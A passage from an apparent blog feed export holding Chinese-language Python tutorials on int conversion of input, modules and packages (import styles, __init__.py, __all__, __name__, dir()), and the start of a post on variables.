<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = s</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>

<br>

<p>解决方法是使用函数<code>int(str)</code>，功能是<font color="#FF7F00"><strong>将字符串类型转换成数字型</strong></font>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="built_in">input</span>(<span class="string">&#x27;birth: &#x27;</span>)</span><br><span class="line">birth = <span class="built_in">int</span>(s)</span><br><span class="line"><span class="keyword">if</span> birth &lt; <span class="number">2000</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00前&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;00后&#x27;</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-模块和包</title>
    <url>/post/Python-Modules-Packages/</url>
    <content><![CDATA[<p>from…import…😀</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>模块和包</font> </center>

<br>

<br>

<h3 id="一-模块与包的意义"><a href="#一-模块与包的意义" class="headerlink" title="一. 模块与包的意义"></a><font color="#FF6347" face="Comic sans MS">一. 模块与包的意义</font></h3><br>

<h4 id="1-1-什么是模块？"><a href="#1-1-什么是模块？" class="headerlink" title="1.1 什么是模块？"></a><font color="#3CB371" face="Comic sans MS">1.1 什么是模块？</font></h4><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>在Python中，一个.py文件就称之为一个模块（Module）。</strong></font></p>
</blockquote>
<br>


<h4 id="1-2-为什么要使用模块？"><a href="#1-2-为什么要使用模块？" class="headerlink" title="1.2 为什么要使用模块？"></a><font color="#3CB371" face="Comic sans MS">1.2 为什么要使用模块？</font></h4><ul>
<li><p><font face="Microsoft YaHei">为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。</font></p>
</li>
<li><p><font face="Microsoft YaHei">随着程序的发展，功能越来越多，为了方便管理，我们通常将程序分成一个个的文件，这样做程序的结构更清晰，方便管理。这时我们不仅仅可以把这些文件当做脚本去执行，还可以把他们当做模块来导入到其他的模块中，实现了功能的重复利用。</font></p>
</li>
<li><p><font face="Microsoft YaHei">我们在编写程序的时候，也经常引用其他模块，包括Python内置的模块和来自第三方的模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。</font></p>
</li>
</ul>
<br>


<h4 id="1-3-什么是包？"><a href="#1-3-什么是包？" class="headerlink" title="1.3 什么是包？"></a><font color="#3CB371" face="Comic sans MS">1.3 什么是包？</font></h4><ol>
<li><p><font face="Microsoft YaHei">如果不同的人编写的模块名相同怎么办？为了避免模块名冲突，Python又引入了按目录（文件夹）来组织模块的方法，称为包（Package）。</font></p>
</li>
<li><p><font face="Microsoft YaHei">包是目录级的（文件夹级），文件夹是用来组成py文件（包的本质就是一个包含<code>__init__.py</code>文件的目录）</font></p>
</li>
<li><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>每一个包目录下面都会有一个 <code>__init__.py</code> 的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包</strong></font>。它可以是空文件，也可以有Python代码，因为 <code>__init__.py</code> 本身就是一个模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的 <code>__init__.py</code> ，<font color="#FF7F00"><strong>导入包本质就是在导入该文件</strong></font>。</font></p>
</li>
<li><p><font face="Microsoft YaHei">文件夹里面还可以包含文件夹（可以有多级目录，组成多级层次的包结构）。但是每一个文件夹下面必须有一个 <code>__init__.py</code> 文件。</font></p>
</li>
<li><p><font face="Microsoft YaHei">自己创建模块时要注意命名，不能和Python自带的模块名称冲突。例如，系统自带了sys模块，自己的模块就不可命名为sys.py，否则将无法导入系统自带的sys模块。</font></p>
</li>
</ol>
<br>

<p><font face="Comic sans MS"><strong>举例说明：</strong></font></p>
<p>有个包按照如下目录存放文件：</p>
<p>mycompany<br>├─ __init__.py<br>├─ abc.py<br>└─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，**<code>abc.py</code>** 模块的名字就变成了 <strong><code>mycompany.abc</code></strong> ，类似的，**<code>xyz.py</code>** 的模块名变成了 <strong><code>mycompany.xyz</code></strong> 。</font></p>
</blockquote>
<br>

<p>类似的，可以有多级目录，组成多级层次的包结构。比如如下的目录结构：</p>
<p>mycompany<br> ├─ web<br> │  ├─ __init__.py<br> │  ├─ utils.py<br> │  └─ <a href="http://www.py/">www.py</a><br> ├─ __init__.py<br> ├─ abc.py<br> └─ xyz.py</p>
<blockquote>
<p><font face="Microsoft YaHei">文件<code>www.py</code> 的模块名就是<code>mycompany.web.www</code>，两个文件utils.py的模块名分别是<code>mycompany.utils</code>和 <code>mycompany.web.utils</code></font></p>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>总结</strong><br></font></p>
<p><font face="Microsoft YaHei">模块是一组Python代码的集合，可以使用其他模块，也可以被其他模块使用。<br></font></p>
<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>创建自己的模块时，要注意：</strong></font></p>
<ol>
<li><font face="Microsoft YaHei"> 模块名要遵循Python变量命名规范，不要使用中文、特殊字符；</font></li>
<li><font face="Microsoft YaHei">模块名不要和系统模块名冲突，最好先查看系统是否已存在该模块，检查方法是在Python交互环境执行import abc，若成功则说明系统存在此模块。</font></li>
</ol>
</blockquote>
<br>

<br>

<h3 id="二-使用模块-无包组织"><a href="#二-使用模块-无包组织" class="headerlink" title="二. 使用模块 -- 无包组织"></a><font color="#FF6347" face="Comic sans MS">二. 使用模块 -- 无包组织</font></h3><br>

<blockquote>
<p><font color="#FF7F00"><strong>使用模块的几种语句：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei"><strong>import 语句：</strong> <strong><code>import module1[, module2[,... moduleN]</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>from … import 语句：</strong> <strong><code>from  modname import  name1[, name2[, ... nameN]]</code></strong> </font></li>
<li><font face="Microsoft YaHei"><strong>from … import * 语句：</strong> <strong><code>from  modname import *</code></strong></font></li>
<li><font face="Microsoft YaHei"><strong>__name__属性：</strong> 用来分清该模块是调用者还是被其他模块调用。</font></li>
<li><font face="Microsoft YaHei"><strong>dir() 函数：</strong> 用来查找模块中定义的名字，返回一个有序字符串列表。</font></li>
</ol>
<br>

<h4 id="2-1-import-语句"><a href="#2-1-import-语句" class="headerlink" title="2.1 import 语句"></a><font color="#3CB371" face="Comic sans MS">2.1 import 语句</font></h4><p><font face="Microsoft YaHei">想使用 Python 源文件，只需在另一个源文件里执行 import 语句，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> module1[, module2[,... moduleN]</span><br></pre></td></tr></table></figure>

<ol>
<li><p><font face="Microsoft YaHei">使用 Python 源文件，只需在另一个源文件里执行 import 语句。</font></p>
</li>
<li><p><font face="Microsoft YaHei">一个模块只会被导入一次，不管你执行了多少次import。这样可以防止导入模块被一遍又一遍地执行。</font></p>
</li>
<li><p><font face="Microsoft YaHei">调用者引用模块后可以：<code>模块名.函数名(参数)</code>来使用。</font></p>
</li>
</ol>
<br>

<p>举例说明：<br>当解释器遇到 import 语句，如果模块在当前的搜索路径就会被导入。如想要导入模块 support，需要把命令放在脚本的顶端：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">support.py 文件代码</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_func</span>(<span class="params"> par </span>):</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Hello : &quot;</span>, par)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py 文件代码</span><br><span class="line"><span class="comment"># 导入模块</span></span><br><span class="line"><span class="keyword">import</span> support</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 现在可以调用模块里包含的函数了</span></span><br><span class="line">support.print_func(<span class="string">&quot;Runoob&quot;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">运行test.py实例输出结果：</span><br><span class="line">Hello :  Runoob</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-2-from-…-import-语句"><a href="#2-2-from-…-import-语句" class="headerlink" title="2.2 from … import 语句"></a><font color="#3CB371" face="Comic sans MS">2.2 from … import 语句</font></h4><p><font face="Microsoft YaHei">Python 的 from 语句让你从模块中导入一个指定的部分到当前命名空间中，<strong>这种访问函数时可以直接使用函数名而不需要前缀</strong>，语法如下：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> name1[, name2[, ... nameN]]</span><br></pre></td></tr></table></figure>

<br>

<p>举例说明：<br>例如，要导入模块 fibo 的 fib 函数，使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fibo.py</span><br><span class="line"><span class="comment"># 斐波那契(fibonacci)数列模块</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span>    <span class="comment"># 定义到 n 的斐波那契数列</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        <span class="built_in">print</span>(b, end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="built_in">print</span>()   //输出为<span class="literal">None</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib2</span>(<span class="params">n</span>):</span> <span class="comment"># 返回到 n 的斐波那契数列</span></span><br><span class="line">    result = []</span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b &lt; n:</span><br><span class="line">        result.append(b)</span><br><span class="line">        a, b = b, a+b</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test.py</span><br><span class="line"><span class="keyword">from</span> fibo <span class="keyword">import</span> fib, fib2</span><br><span class="line"><span class="built_in">print</span>(fib(<span class="number">500</span>))</span><br><span class="line"><span class="built_in">print</span>(fib2(<span class="number">500</span>))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span> <span class="number">8</span> <span class="number">13</span> <span class="number">21</span> <span class="number">34</span> <span class="number">55</span> <span class="number">89</span> <span class="number">144</span> <span class="number">233</span> <span class="number">377</span></span><br><span class="line"><span class="literal">None</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, <span class="number">89</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">377</span>]</span><br></pre></td></tr></table></figure>

<br>

<h4 id="2-3-from-…-import-语句"><a href="#2-3-from-…-import-语句" class="headerlink" title="2.3 from … import * 语句"></a><font color="#3CB371" face="Comic sans MS">2.3 from … import * 语句</font></h4><ul>
<li><p><font face="Microsoft YaHei">这提供了一个简单的方法来导入一个模块中的所有项目。然而这种声明不该被过多地使用。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这种方法，可以一次性的把模块中的所有（函数，变量）名称都导入到当前模块的字符表。</font></p>
</li>
<li><p><font face="Microsoft YaHei">这将把所有的名字都导入进来，但是那些由单一下划线（_）开头的名字不在此例。大多数情况， Python程序员不使用这种方法，因为引入的其它来源的命名，很可能覆盖了已有的定义。</font></p>
</li>
</ul>
<br>

<p>把一个模块的所有内容全都导入到当前的命名空间也是可行的，只需使用如下声明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> modname <span class="keyword">import</span> *</span><br></pre></td></tr></table></figure>




<br>

<br>

<h3 id="三-使用模块-有包组织"><a href="#三-使用模块-有包组织" class="headerlink" title="三. 使用模块 -- 有包组织"></a><font color="#FF6347" face="Comic sans MS">三. 使用模块 -- 有包组织</font></h3><ul>
<li><p><font face="Microsoft YaHei">目录只有包含一个叫做 <code>__init__.py</code> 的文件才会被认作是一个包，主要是为了避免一些滥俗的名字（比如叫做 string）不小心的影响搜索路径中的有效模块。</font></p>
</li>
<li><p><font face="Microsoft YaHei">最简单的情况，放一个空的 <code>__init__.py</code>就可以了。当然这个文件中也可以包含一些初始化代码或者为（将在后面介绍的） <code>__all__</code>变量赋值。</font></p>
</li>
</ul>
<br>

<p><font color="#00B2EE" face="Comic sans MS">1. <strong>import 语句：</strong></font></p>
<p>用户可以每次只导入一个包里面的特定模块，他必须使用全名去访问:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> 包名.子包名.模块名                 导入模块</span><br><span class="line"></span><br><span class="line">包名.子包名.模块名 .函数名(参数)           使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">2. <strong>import …from 语句：</strong></font>    </p>
<p>同样会导入子模块，他不需要那些冗长的前缀，只需要<code>模块名.函数名(参数)</code>即可，推荐使用！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> 模块名           导入模块</span><br><span class="line"></span><br><span class="line">模块名.函数名(参数)                      使用模块</span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS">3. <strong>import …from 语句：</strong></font></p>
<p>还有一种变化就是直接导入一个函数或者变量:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名.模块名  <span class="keyword">import</span> 函数名      导入模块</span><br><span class="line">函数名(参数)                               使用模块</span><br></pre></td></tr></table></figure>

<br>

<br>

<p><font color="#00B2EE" face="Comic sans MS">4. <strong>import …from * 语句：</strong></font></p>
<blockquote>
<p><font color="red" face="Comic sans MS" size=4><strong>注意：这种导入方法必须要注意<code>__init__.py</code>里面的属性<code>__all__</code>已经设置好。<code>__all__</code>是用于控制from…import *</strong><br></font></p>
</blockquote>
<p><font face="Microsoft YaHei">Python 会进入文件系统，找到这个包里面所有的子模块，一个一个的把它们都导入进来。但是很不幸，这个方法在 Windows平台上工作的就不是非常好，因为Windows是一个大小写不区分的系统。</font></p>
<p><font face="Microsoft YaHei">在这类平台上，没有人敢担保一个叫做 ECHO.py 的文件导入为模块 echo 还是 Echo 甚至 ECHO。</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> 包名.子包名 <span class="keyword">import</span> *                 导入所有模块</span><br><span class="line">模块名.函数名(参数)                        使用模块</span><br></pre></td></tr></table></figure>

<p><strong>具体使用方法请看下面章节四。</strong></p>
<br>

<blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>总结使用时注意事项：</strong></font></p>
</blockquote>
<ol>
<li><font face="Microsoft YaHei">注意当使用<code>from package import item</code>这种形式的时候，对应的<font color="#FF7F00"><strong>item既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量</strong></font>。</font></li>
<li><font face="Microsoft YaHei">import语法会首先把item当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，恭喜，一个:exc:ImportError 异常被抛出了。</font></li>
<li><font face="Microsoft YaHei">反之，如果使用形如<code>import item.subitem.subsubitem</code>这种导入形式，<font color="#FF7F00"><strong>最后一项可以是包或者模块（不可以是类，函数或者变量的名字），除了最后一项，都必须是包。</strong></font>。</li>
</ol>
<br>

<br>

<h3 id="四-init-、-all-、-name-、-author-、-doc-、dir-函数"><a href="#四-init-、-all-、-name-、-author-、-doc-、dir-函数" class="headerlink" title="四. __init__、__all__、__name__、__author__、__doc__、dir()函数"></a><font color="#FF6347" face="Comic sans MS">四. __init__、__all__、__name__、__author__、__doc__、dir()函数</font></h3><br>

<h4 id="4-1-init-、-all"><a href="#4-1-init-、-all" class="headerlink" title="4.1 __init__、__all__"></a><font color="#3CB371" face="Comic sans MS">4.1 __init__、__all__</font></h4><p><font face="Microsoft YaHei">在使用<code>from 包名.子包名 import \* 语句</code>时必须修改<code>__init__.py</code>文件的<code>__all__</code>    列表变量。</font></p>
<blockquote>
<ol>
<li><font face="Microsoft YaHei">如果包定义文件 <code>__init__.py</code> 存在一个叫做 <code>__all__</code>     的列表变量，那么在使用 <code>from package import *</code>的时候就把这个列表中的所有名字作为包内容导入。</font></li>
<li><font face="Microsoft YaHei">作为包的作者，可别忘了在更新包之后保证 <code>__all__</code>     也更新了啊。你说我就不这么做，我就不使用导入<code>*</code>这种用法，好吧，没问题。这里有一个例子</font></li>
<li><font face="Microsoft YaHei">这表示当你使用<code>from sound.effects import *</code>这种用法时，你只会导入如下包里面这三个子模块。即这种语法导入的是<code>__all__</code>指定的模块。</font></li>
<li><font face="Microsoft YaHei">在python3中，即使包下没有<code>__init__.py</code>文件，import 包仍然不会报错，而在python2中，包下一定要有该文件，否则import 包报错</font></li>
<li><font face="Microsoft YaHei">import导入文件时，产生名称空间中的名字来源于文件，import 包，产生的名称空间的名字同样来源于文件，即包下的<code>__init__.py</code>，导入包本质就是在导入该文件。</font></li>
</ol>
</blockquote>
<br>
上述的例子：

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__all__ = [<span class="string">&quot;echo&quot;</span>, <span class="string">&quot;surround&quot;</span>, <span class="string">&quot;reverse&quot;</span>]</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-1-name-、-main"><a href="#4-1-name-、-main" class="headerlink" title="4.1 __name__、__main__"></a><font color="#3CB371" face="Comic sans MS">4.1 __name__、__main__</font></h4><ol>
<li><p><font face="Microsoft YaHei">__name__是一个变量。前后加了爽下划线是因为是因为这是系统定义的名字。普通变量不要使用此方式命名变量。</font></p>
</li>
<li><p><font face="Microsoft YaHei">__name__就是标识模块的名字的一个系统变量。这里分两种情况：</font></p>
<ol>
<li><font face="Microsoft YaHei">假如当前模块是主模块（也就是调用其他模块的模块），那么此模块名字就是__main__，即__name__&#x3D;&#x3D;__main__。可以执行后面的内容；</font></li>
<li><font face="Microsoft YaHei">假如此模块是被import的，其值为被调用模块所属的路径。</li>
</ol>
</li>
</ol>
<br>

<p>下面举一个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test1.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;程序自身在运行&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&#x27;我来自另一模块&#x27;</span>)</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test2.py</span><br><span class="line"><span class="keyword">import</span> test1</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">运行test2.py输出结果：</span><br><span class="line">我来自另一模块</span><br><span class="line"></span><br><span class="line">运行test1.py输出结果：</span><br><span class="line">程序自身在运行</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-3-author-、-doc"><a href="#4-3-author-、-doc" class="headerlink" title="4.3 __author__、__doc__"></a><font color="#3CB371" face="Comic sans MS">4.3 __author__、__doc__</font></h4><p><font face="Microsoft YaHei"><font color="#FF7F00"><strong>文档注释：</strong></font>任何模块代码的第一个字符串都被视为模块的文档注释；</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__doc__</code>：</strong></font>可以访问一个文件中的第一个单引号（1、2、3对）、双引号（1、2、3对）注释的文档。</font></p>
<p><font face="Microsoft YaHei"><font color="#FF7F00"><strong><code>__author__</code>：</strong></font>可以将一个文件的作者名字赋给它。</font></p>
<br>

<p>应用示例如下：<br><font color="#FF7F00"></font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line"></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__author__)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">10</span></span><br><span class="line"> a test module</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br></pre></td></tr></table></figure>


<br>

<h4 id="4-4-dir-函数"><a href="#4-4-dir-函数" class="headerlink" title="4.4 dir()函数"></a><font color="#3CB371" face="Comic sans MS">4.4 dir()函数</font></h4><blockquote>
<p><font face="Microsoft YaHei">内置的函数 dir() 可以<font color="#FF7F00"><strong>找到模块内定义的所有名称。以一个字符串列表的形式返回</strong></font> 。</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>无参数：</strong></font> 只能列举当前模块已经被定义的名字；</font><br><font face="Microsoft YaHei"><font color="#FF7F00"><strong>有参数：</strong></font> 参数只能是已经引用的模块名字，不能为自身名字，否则会报错。</font></p>
</blockquote>
<br>

<p>举例子说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; a test module &#x27;</span> </span><br><span class="line"><span class="string">&#x27;fgbhjknml&#x27;</span></span><br><span class="line">__author__ = <span class="string">&#x27;Directoree&#x27;</span></span><br><span class="line">a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(__doc__)</span><br><span class="line"><span class="built_in">print</span>(__author__)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>())</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"> a test module</span><br><span class="line">Directoree</span><br><span class="line">[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line"></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">test3.py</span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> test3  </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(test3))</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;__author__&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;bbb&#x27;</span>]</span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="五-非公开函数"><a href="#五-非公开函数" class="headerlink" title="五. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">五. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00" face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p><font face="Microsoft YaHei">类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；<br></font><br><font face="Microsoft YaHei"></font></p>
<p><font face="Microsoft YaHei">之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</font></p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p><font face="Microsoft YaHei">我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：<br></font></p>
<p><font face="Microsoft YaHei"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public。</strong><br></font></p>
<hr>
<hr>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-变量和数据类型</title>
    <url>/post/Python-Variables-DataTypes/</url>
    <content><![CDATA[<p>定义一个变量就是定义了一个指针！  ٩(ˊᗜˋ*)و<br>字符串内容很多，就很烦(っ ̯ -｡)</p>
<span id="more"></span>


<br>

<br>

<center><font color="#00B2EE" face="Comic sans MS" size=5>变量和数据类型</font> </center>

<br>

<br>

<h3 id="一-变量"><a href="#一-变量" class="headerlink" title="一. 变量"></a><font color="#FF6347" face="Comic sans MS">一. 变量</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、关于变量</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">变量存储在内存中的值。这就意味着在创建变量时会<strong>在内存中开辟一个空间</strong>。</font></li>
<li><font face="Comic sans MS">基于变量的数据类型，解释器会分配指定内存，并决定什么数据可以被存储在内存中。</font></li>
<li><font face="Comic sans MS">Python 中的变量不需要声明。每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">在 Python 中，变量就是变量，它没有类型，我们所说的”类型”是变量所指的内存中对象的类型。</font></li>
</ol>
</blockquote>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、变量的赋值</strong></font></p>
<blockquote>
<ol>
<li><font face="Comic sans MS">Python 中的变量赋值<font color="#FF7F00"><strong>不需要类型声明</strong></font>。</font></li>
<li><font face="Comic sans MS">每个变量在内存中创建，都包括变量的标识，名称和数据这些信息。</font></li>
<li><font face="Comic sans MS">每个变量在使用前都必须赋值，变量赋值以后该变量才会被创建。</font></li>
<li><font face="Comic sans MS">变量的赋值分为：<font color="#FF7F00"><strong>单个变量赋值</strong></font>和<font color="#FF7F00"><strong>多个变量赋值</strong></font> </font></li>
</ol>
</blockquote>
<br>

<p><font face="Comic sans MS"><strong>单个变量赋值：</strong>使用等号（&#x3D;）运算符左边是一个变量名,等号（&#x3D;）运算符右边是存储在变量中的值。例如：</font></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">message = <span class="string">&quot;Hello Python world!&quot;</span></span><br><span class="line"><span class="built_in">print</span>(message)</span><br></pre></td></tr></table></figure>

